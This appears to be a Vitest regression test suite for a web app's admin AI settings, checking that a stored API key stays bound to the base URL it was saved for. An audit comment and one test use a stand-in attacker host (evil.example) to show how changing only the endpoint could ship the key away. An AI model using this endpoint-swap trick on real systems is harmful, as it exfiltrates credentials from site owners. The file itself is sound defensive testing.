import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { type Suite, authHeaders, login, setupApi } from "./helpers.js";

/**
 * Audit 2026-09-30: a stored AI key was bound to its PROVIDER but not to its
 * endpoint. `POST /manage/site/ai {baseUrl:"https://evil.example/v1"}` with no
 * provider change kept the stored openai key, and the next Test / model list
 * sent it to the new host as `Authorization: Bearer <key>` — the exact
 * exfiltration the provider binding exists to stop (a hijacked admin session
 * can only ever SEE last4, but could still ship the whole key away).
 */
describe("a stored AI key is bound to the base URL it was saved for", () => {
  let s: Suite;
  let admin: Awaited<ReturnType<typeof login>>;
  const KEY = "sk-oai-bound-secret-7788";

  beforeAll(async () => {
    s = await setupApi();
    admin = await login(s.app, "admin@paperboy.test", "Admin!Passw0rd");
  });
  afterAll(async () => {
    vi.unstubAllGlobals();
    await s.app.close();
  });

  const post = (payload: Record<string, unknown>) =>
    s.app.inject({ method: "POST", url: "/api/v1/manage/site/ai", headers: authHeaders(admin), payload });

  it("re-saving the same base URL keeps the key", async () => {
    expect((await post({ provider: "openai", apiKey: KEY, baseUrl: "https://llm.example/v1" })).statusCode).toBe(200);
    const same = await post({ baseUrl: "https://llm.example/v1/" });
    expect(same.json()).toMatchObject({ configured: true, source: "db", last4: "7788" });
  });

  it("changing only the base URL does not send the stored key to the new host", async () => {
    const seen: string[] = [];
    vi.stubGlobal("fetch", vi.fn(async (url: string, init?: RequestInit) => {
      const auth = new Headers(init?.headers).get("authorization");
      if (auth) seen.push(`${url} ${auth}`);
      return new Response(JSON.stringify({ choices: [{ message: { content: "ok" } }] }), { status: 200, headers: { "content-type": "application/json" } });
    }));
    try {
      const moved = await post({ baseUrl: "https://evil.example/v1" });
      expect(moved.statusCode).toBe(200);
      expect(moved.json()).toMatchObject({ configured: false, last4: null });
      await s.app.inject({ method: "POST", url: "/api/v1/manage/site/ai/test", headers: authHeaders(admin), payload: {} });
      expect(seen.filter((l) => l.includes(KEY))).toEqual([]);
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("a new key sent together with the new base URL is kept (bound to that URL)", async () => {
    const both = await post({ apiKey: "sk-oai-second-1122", baseUrl: "https://other.example/v1" });
    expect(both.json()).toMatchObject({ configured: true, source: "db", last4: "1122", baseUrl: "https://other.example/v1" });
  });
});
